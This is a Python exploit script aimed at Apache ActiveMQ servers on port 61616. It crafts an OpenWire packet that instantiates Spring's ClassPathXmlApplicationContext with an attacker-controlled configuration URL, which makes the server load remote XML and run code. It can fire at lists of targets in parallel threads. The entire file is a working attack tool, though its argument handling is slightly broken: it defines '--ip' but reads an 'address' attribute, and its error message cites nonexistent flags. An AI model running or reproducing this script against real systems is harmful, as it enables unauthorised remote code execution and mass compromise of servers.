import binascii
import socket
import argparse
import sys
import threading
import os

os.system("figlet MRPENTST | lolcat")
def format_integer_as_hexadecimal(integer_value, hex_padding):
    return format(integer_value, 'x').zfill(hex_padding)

def encode_string_to_hexadecimal(string_value):
    return binascii.hexlify(string_value.encode()).decode()

def dispatch_custom_payload(target_address, configuration_url, connection_timeout):
    context_identifier = "org.springframework.context.support.ClassPathXmlApplicationContext"
    payload_content = configuration_url

    header_prefix = "1f00000000000000000001"
    payload_body = header_prefix + "01" + format_integer_as_hexadecimal(len(context_identifier), 4) + encode_string_to_hexadecimal(context_identifier) + "01" + format_integer_as_hexadecimal(len(payload_content), 4) + encode_string_to_hexadecimal(payload_content)
    complete_payload = format_integer_as_hexadecimal(len(payload_body)//2, 8) + payload_body
    binary_payload = bytes.fromhex(complete_payload)

    print(f"[*] Dispatching to: {target_address}")

    try:
        with socket.create_connection((target_address, 61616), timeout=connection_timeout) as connection:
            connection.sendall(binary_payload)
            print(f"[+] Dispatched to: {target_address}")
    except socket.timeout:
        print(f"[*] Connection to {target_address} timed out.")
    except Exception as exc:
        print(f"Error with {target_address}: {exc}")

def show_banner():
    print("Custom Python Script for ActiveMQ Exploit")

def setup_arguments():
    argument_parser = argparse.ArgumentParser(description="ActiveMQ Server Exploit Script")
    argument_parser.add_argument("-f", "--file", help="file file with ActiveMQ Server addresses")
    argument_parser.add_argument("-ip", "--ip", help="Single ActiveMQ Server address")
    argument_parser.add_argument("-c", "--config", help="Configuration URL", required=True)
    argument_parser.add_argument("-d", "--delay", type=int, default=10, help="Connection delay per request (seconds)")
    return argument_parser.parse_args()

def fetch_addresses_from_file(file_file):
    try:
        with open(file_file, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Error: file file '{file_file}' not found.")
        sys.exit(1)

def execute_script():
    show_banner()

    cmd_arguments = setup_arguments()

    if cmd_arguments.file:
        server_addresses = fetch_addresses_from_file(cmd_arguments.file)
    elif cmd_arguments.address:
        server_addresses = cmd_arguments.address.split(',')
    else:
        print("Error: Please provide a file file (-s) or a server address (-a).")
        sys.exit(1)

    config_urls = cmd_arguments.config.split(',')

    execution_threads = []
    for addr in server_addresses:
        for url in config_urls:
            thread = threading.Thread(target=dispatch_custom_payload, args=(addr, url.strip(), cmd_arguments.delay))
            execution_threads.append(thread)
            thread.start()

    for thread in execution_threads:
        thread.join()

if __name__ == "__main__":
    execute_script()
